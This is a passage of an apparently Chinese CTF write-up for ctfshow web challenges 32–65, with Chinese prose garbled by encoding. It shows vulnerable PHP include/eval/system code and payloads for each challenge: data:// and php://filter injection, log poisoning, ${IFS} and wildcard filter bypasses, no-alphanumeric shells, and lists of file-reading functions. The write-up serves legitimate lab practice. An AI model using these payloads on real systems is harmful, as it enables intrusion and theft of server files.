src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424163928570.png" alt="image-20220424163928570"></p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">getä¼ å‚?c&#x3D;include%0a$_POST[1]?&gt;postå†…å®¹1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;);</code></pre><p>å®˜æ–¹payload</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;æ„Ÿè§‰ä¸­é—´è¿™ä¸ªniceæ²¡å•¥ç”¨</code></pre><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h2><p>åŒ32</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h2><p>åŒ32</p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h2><p>åŒ32</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><p>åŒ32ï¼Œå°±æ˜¯æ³¨æ„ä¸è¦ç”¨æ•°å­—å½“å‚æ•°å</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>ç›´æ¥dataä¼ªåè®®è¯»å–</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);</code></pre><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123;        include($c);        echo $flag;        &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>dataä¼ªåè®®åŠ çŸ­æ ‡ç­¾</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;);</code></pre><p>è‡³äºåˆ©ç”¨æ—¥å¿—æ–‡ä»¶çš„éƒ¨åˆ†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåªæœ‰ç”¨çŸ­æ ‡ç­¾çš„æ—¶å€™æ‰èƒ½æˆåŠŸ</p><p>é¦–å…ˆç”¨bpé¿å…ç®­å¤´ç¬¦å·çš„è½¬ä¹‰ï¼ˆè¿™é‡Œä¹Ÿæ˜¯åªæœ‰ä½œä¸ºcçš„å€¼ä¸”ç”¨çŸ­æ ‡ç­¾çš„æ—¶å€™æ‰ä¼šä¸è½¬ä¹‰ï¼Œweb37ä¹Ÿä¸€æ ·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172239712.png" alt="image-20220424172239712"></p><p>ç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«è®¿é—®nginxçš„æ—¥å¿—æ–‡ä»¶/var/log/nginx/access.log</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424172302924.png" alt="image-20220424172302924"></p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;flag in flag.phperror_reporting(0);if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123;        include($c.&quot;.php&quot;);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>å°–æ‹¬å·é—­åˆæ‰åé¢çš„.phpå°±è¡Œäº†</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt;</code></pre><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;if(isset($_GET[&#39;c&#39;]))&#123;    $c &#x3D; $_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;[0-9]|\~|\&#96;|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\&#x3D;|\+|\&#123;|\[|\]|\&#125;|\:|\&#39;|\&quot;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\\\\&#x2F;i&quot;, $c))&#123;        eval($c);    &#125;        &#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><p>å¯ä»¥ç”¨æ— å‚æ•°rceï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤çš„æ˜¯ä¸­æ–‡çš„æ‹¬å·</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>æˆ–è€…åˆ©ç”¨session,ä½†æ˜¯</p><pre class="language-php" data-language="php"><code class="language-php">åˆ©ç”¨session_id()è®©phpè¯»å–æˆ‘ä»¬è®¾ç½®çš„cookieï¼ˆsessioné»˜è®¤ä¸ä½¿ç”¨æ‰€ä»¥åŠ äº†session_start()è®©phpå¼€å§‹ä½¿ç”¨sessionï¼‰å—phpç‰ˆæœ¬å½±å“ 5.5 -7.1.9å‡å¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ã€‚åœ¨5.5ä»¥ä¸‹åŠ7.1ä»¥ä¸Šå‡æ— æ³•å†™å…¥é™¤æ­¤ä¹‹å¤–çš„å†…å®¹ã€‚ä½†æ˜¯ç¬¦åˆè¦æ±‚çš„å­—ç¬¦è¿˜æ˜¯å¯ä»¥çš„</code></pre><p>æ‰€ä»¥é¢˜ç›®ç¯å¢ƒèƒ½åšåˆ°çš„ä¹Ÿå°±åªæœ‰ä¸ªlså’Œwhoamiä¹‹ç±»çš„å‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175319501.png" alt="image-20220424175319501"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424175412309.png" alt="image-20220424175412309"></p><p>æœ¬æ¥è¿˜å¯ä»¥åˆ©ç”¨base64ï¼Œä½†æ˜¯é¢˜ç›®æŠŠæ•°å­—ä¹Ÿè¿‡æ»¤äº†ï¼Œä¸èƒ½è¿›è¡Œè§£ç ï¼Œåªèƒ½ç”¨æœ¬åœ°ç¯å¢ƒå¤ç°äº†</p><p>æˆ‘è¿™é‡Œç›´æ¥è´´äº†å…¶ä»–å¸ˆå‚…çš„å›¾ç‰‡äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/b041616efce14720b67c1b942dc4eded.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/4f4e320ad873468aa563357f66b0ac13.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>è¿˜æœ‰ä¸€ç§å§¿åŠ¿</strong></p><pre class="language-none"><code class="language-none">get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡åˆ—è¡¨çš„å¤šç»´æ•°ç»„ï¼Œè¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ã€‚array_pop() æ˜¯åˆ é™¤å¹¶è¿”å›æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚next() è¿”å›æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180340722.png" alt="image-20220424180340722"></p><p>æˆ‘ä»¬ç”¨current()å¯ä»¥è·å–åˆ°GETæ•°ç»„ï¼Œç”¨next()å¯ä»¥è·å–åˆ°POSTæ•°ç»„ï¼Œç„¶åç”¨array_pop()å–å‡ºPOSTæ•°ç»„é‡Œé¢çš„å…ƒç´ ï¼Œæœ€åç”¨evalæ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180605396.png" alt="image-20220424180605396"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180751358.png" alt="image-20220424180751358"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424180829456.png" alt="image-20220424180829456"></p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><p>æˆ–è¿ç®—ç»•è¿‡ï¼Œç›´æ¥ç”¨ç¾½å¸ˆå‚…çš„è„šæœ¬ä¹Ÿè¡Œã€‚</p><p>ä¸è¿‡è¦æ˜¯ç›´æ¥è¾“payloadè¦åœ¨bpé‡Œï¼Œåº”è¯¥æ˜¯hackbarçš„ç¼–ç æœ‰ç‚¹é—®é¢˜</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220424182050495.png" alt="image-20220424182050495"></p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;  $c&#x3D;$_GET[&#39;c&#39;];  system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);&#125;else&#123;  highlight_file(__FILE__);&#125;</code></pre><p>&gt; ä»£è¡¨é‡å®šå‘åˆ°å“ªé‡Œ<br>/dev/null ä»£è¡¨ç©ºè®¾å¤‡æ–‡ä»¶<br>2&gt; è¡¨ç¤ºstderræ ‡å‡†é”™è¯¯<br>&amp; è¡¨ç¤ºç­‰åŒäºçš„æ„æ€ï¼Œ2&gt;&amp;1ï¼Œè¡¨ç¤º2çš„è¾“å‡ºé‡å®šå‘ç­‰åŒäº1<br>1 è¡¨ç¤ºstdoutæ ‡å‡†è¾“å‡ºï¼Œç³»ç»Ÿé»˜è®¤å€¼æ˜¯1ï¼Œæ‰€ä»¥&gt;/dev/nullç­‰åŒäº 1&gt;/dev/null<br>å› æ­¤ï¼Œ&gt;/dev/null 2&gt;&amp;1 ä¹Ÿå¯ä»¥å†™æˆ1&gt; /dev/null 2&gt; &amp;1</p><p>æœ¬é¢˜è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸ºï¼š<br>1&gt;/dev/null ï¼šé¦–å…ˆè¡¨ç¤ºæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯ä¸è¾“å‡ºä»»ä½•ä¿¡æ¯åˆ°ç»ˆç«¯ï¼Œä¸æ˜¾ç¤ºä»»ä½•ä¿¡æ¯ã€‚<br>2&gt;&amp;1 ï¼š æ¥ç€ï¼Œæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå› ä¸ºä¹‹å‰æ ‡å‡†è¾“å‡ºå·²ç»é‡å®šå‘åˆ°äº†ç©ºè®¾å¤‡æ–‡ä»¶ï¼Œæ‰€ä»¥æ ‡å‡†é”™è¯¯è¾“å‡ºä¹Ÿé‡å®šå‘åˆ°ç©ºè®¾å¤‡æ–‡ä»¶ã€‚</p><p>è¡¥å……ï¼š<br>0è¡¨ç¤ºé”®ç›˜è¾“å…¥ï¼Œ1è¡¨ç¤ºå±å¹•è¾“å‡ºï¼Œ2è¡¨ç¤ºé”™è¯¯è¾“å‡ºï¼<br>â€˜ &gt; â€™ é»˜è®¤æ ‡å‡†è¾“å‡ºé‡å®šå‘ï¼Œä¸1&gt;ç›¸åŒ<br>2&gt;&amp;1 æ„æ€æ˜¯æŠŠæ ‡å‡†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º<br>&amp;&gt;file æ„æ€æ˜¯æŠŠæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½é‡å®šå‘åˆ°æ–‡ä»¶fileä¸­</p><p>åˆ©ç”¨%0aæ¢è¡ŒæŠŠå®ƒæ¢ä¸‹å»æˆ–è€…å…¶ä»–çš„è¯­å¥æ¥æˆªæ–­</p><pre class="language-none"><code class="language-none">?c&#x3D;cat flag.php%0a?c&#x3D;cat flag.php||?c&#x3D;cat flag.php%26?c&#x3D;cat flag.php%26%26?c&#x3D;cat flag.php;</code></pre><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><pre class="language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payloadåŸºæœ¬ä¸Šå’Œ42çš„ä¸€æ ·ï¼Œå°±æ˜¯æŠŠcatæ¢æˆuniqï¼Œtacï¼Œnlä¹‹ç±»çš„</p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åœ¨web43çš„åŸºç¡€ä¸ŠåŠ ä¸Šé€šé…ç¬¦</p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><p>ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_matchd(&quot;&#x2F;\;|cat|flag| &#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>ç”¨${IFS}æ›¿ä»£ç©ºæ ¼</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;nl$&#123;IFS&#125;f*||</code></pre><h2 id="web46-51"><a href="#web46-51" class="headerlink" title="web46-51"></a>web46-51</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\\$|\*&#x2F;i&quot;, $c))&#123;        system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>ç”¨&lt;æˆ–&lt;&gt;ä»£æ›¿ç©ºæ ¼ï¼Œç”¨â€˜â€™æˆªæ–­flagå…³é”®å­—</p><pre class="language-none"><code class="language-none">c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php||</code></pre><p><strong>web47</strong></p><p>å’Œ46ä¸€æ ·çš„</p><pre class="language-php" data-language="php"><code class="language-php">nl&lt;&gt;fla&#39;&#39;g.php||</code></pre><p><strong>web48</strong></p><p>åŒ46</p><pre class="language-none"><code class="language-none">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹less:ä¸ more ç±»ä¼¼ head:æŸ¥çœ‹å¤´å‡ è¡Œtac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯cat çš„åå‘æ˜¾ç¤ºtail:æŸ¥çœ‹å°¾å‡ è¡Œnlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹sort:å¯ä»¥æŸ¥çœ‹uniq:å¯ä»¥æŸ¥çœ‹ file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ grep:åœ¨å½“å‰ç›®å½•ä¸­ï¼ŒæŸ¥æ‰¾åç¼€æœ‰ file å­—æ ·çš„æ–‡ä»¶ä¸­åŒ…å« test å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²çš„è¡Œã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š grep test *file strings</code></pre><p><strong>web49</strong></p><p>åŒ46</p><p>è¿™ä¸ªä¹Ÿè¡Œ</p><pre class="language-none"><code class="language-none">?c&#x3D;nl%09fl&quot;&quot;ag.php%0a</code></pre><p><strong>web50</strong></p><p>åŒ46</p><p><strong>web51</strong></p><p>åŒ46</p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><p>è¿‡æ»¤äº†å¤§äºå°äºï¼Œä½†æ˜¯æ²¡è¿‡æ»¤$ç¬¦</p><pre class="language-none"><code class="language-none">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></pre><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        echo($c);        $d &#x3D; system($c);        echo &quot;&lt;br&gt;&quot;.$d;    &#125;else&#123;        echo &#39;no&#39;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php</code></pre><h2 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h2><pre class="language-none"><code class="language-none">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload</p><pre class="language-none"><code class="language-none">?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f???????</code></pre><p>é€šé…ç¬¦ç»•è¿‡</p><h2 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|\&#96;|\%|\x09|\x26|\&gt;|\&lt;&#x2F;i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>payload1</p><p>åˆ©ç”¨base64å‘½ä»¤å’Œé€šé…ç¬¦</p><pre class="language-none"><code class="language-none">c&#x3D;&#x2F;???&#x2F;????64 ????.???</code></pre><p>payload2</p><p>pç‰›æ˜¯çœŸçš„å‰å®³</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list</a></p><p>ç›´æ¥åˆ©ç”¨pç‰›åšå®¢é‡Œçš„è¿™ä¸ª</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174531949.png" alt="image-20220430174531949"></p><p>ç„¶åcat flag.php</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430174552316.png" alt="image-20220430174552316"></p><p>æœ‰å‡ ç‡ä¸æˆåŠŸï¼Œå› ä¸ºä¸´æ—¶æ–‡ä»¶çš„æ–‡ä»¶åæ˜¯éšæœºçš„ï¼Œå¦‚æœæ²¡æˆåŠŸå°±æ˜¯æ²¡å¤§å†™ï¼Œå¤šè¯•å‡ æ¬¡å°±è¡Œäº†</p><h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430175025474.png" alt="image-20220430175025474"></p><p>å¦å¤–è¿™é‡Œå¦‚æœæ˜¯evalå‡½æ•°ï¼Œé‚£æ‰§è¡Œæ—¶è¿˜è¦åŠ ä¸Š?&gt;&lt;?=</p><p>payloadä¸º</p><pre class="language-php" data-language="php"><code class="language-php">?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt;</code></pre><p>  åŸå› æ˜¯eval()å‡½æ•°ç›¸å½“äºæ‰§è¡Œphpçš„ä»£ç ï¼Œè€Œ&lt;?= å°±ç›¸å½“äº&lt;?php echo<code> </code>åœ¨PHP7ä»¥ä¸Šä¸ç®¡short_open_tagé…ç½®æ˜¯ä¸æ˜¯å¼€å¯çš„ã€‚éƒ½å¯ä»¥ä½¿ç”¨ã€‚æ‰€ä»¥å°±ç›¸å½“äºä¸€ä¸ªæ–°çš„PHPæ–‡ä»¶ï¼Œè¿™æ ·çš„è¯å°±éœ€è¦å°†æœ€å¼€å§‹å‰é¢çš„&lt;?phpç»™é—­åˆï¼Œä¸ç„¶ä¸ä¼šæ‰§è¡Œã€‚</p><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F; è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ&#x2F;&#x2F;flag in 36.phpif(isset($_GET[&#39;c&#39;]))&#123;    $c&#x3D;$_GET[&#39;c&#39;];    if(!preg_match(&quot;&#x2F;\;|[a-z]|[0-9]|\&#96;|\|\#|\&#39;|\&quot;|\&#96;|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\&#x3D;|\[&#x2F;i&quot;, $c))&#123;        system(&quot;cat &quot;.$c.&quot;.php&quot;);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p><code>$&#123;_&#125;</code>:ä»£è¡¨ä¸Šä¸€æ¬¡å‘½ä»¤æ‰§è¡Œçš„ç»“æœ<br><code>$(())</code>: åšè¿ç®—</p><p>ä¹‹å‰æ²¡æœ‰å‘½ä»¤è¿”å›æˆ–è€…æ‰§è¡Œ,ç»“æœåº”è¯¥æ˜¯ç©º,ä¸<code>&quot;&quot;</code>ç­‰ä»·<br>åˆ <code>$((&quot;&quot;))</code>å€¼ä¸º0,<code>$((~$((&quot;&quot;))))</code>å€¼ä¸º-1,å†åšæ‹¼æ¥:</p><p>payload</p><pre class="language-none"><code class="language-none">$((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))))))</code></pre><h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p>æœ‰ä¸€å †ç¦ç”¨å‡½æ•°</p><p>print_r(scandir(&#39;.&#39;));æˆ–è€…print_r(glob(&quot;*&quot;));è¯»ç›®å½•</p><table><thead><tr><th></th><th>æ‰«ç›®å½•æ‰¾flagä½ç½®</th></tr></thead><tbody><tr><td></td><td>print_r(scandir(&#39;./&#39;));</td></tr><tr><td></td><td>$a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;}</td></tr><tr><td></td><td>var_dump(scandir(&quot;/&quot;));</td></tr><tr><td></td><td>$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);}</td></tr></tbody></table><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430181502718.png" alt="image-20220430181502718"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220430182020777.png" alt="image-20220430182020777"></p><p>c=print_r(file_get_contents(&#39;flag.php&#39;));æˆ–è€…readfileæˆ–è€…show_sourceæˆ–è€…highlight_fileè¯»æ–‡ä»¶</p><p>è¿˜å¯ä»¥æ›´éªšä¸€ç‚¹</p><p>POST c=include($_GET[&#39;url&#39;]); </p><p>GET /?url=php://filter/read=convert.base64-encode/resource=flag.php</p><p>é™„ä¸€ç‚¹è¯»æ–‡ä»¶çš„æ–¹å¼</p><pre class="language-php" data-language="php"><code class="language-php">highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); &#x2F;&#x2F; var_dumpfread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;)));include($filename); &#x2F;&#x2F; éphpä»£ç include_once($filename); &#x2F;&#x2F; éphpä»£ç require($filename); &#x2F;&#x2F; éphpä»£ç require_once($filename); &#x2F;&#x2F; éphpä»£ç   ä¼ªåè®®è¯»æºç print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; è¯»å–ä¸€è¡Œ$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D;    fgets($a);echo $line;&#125;fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; ä»å½“å‰ä½ç½®ä¸€ç›´è¯»å–åˆ° EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125;print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; ä»æ–‡ä»¶æŒ‡é’ˆä¸­è¯»å–ä¸€è¡Œå¹¶è¿‡æ»¤æ‰ HTML æ ‡è®°print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;;print_r(parse_ini_file($filename)); &#x2F;&#x2F; 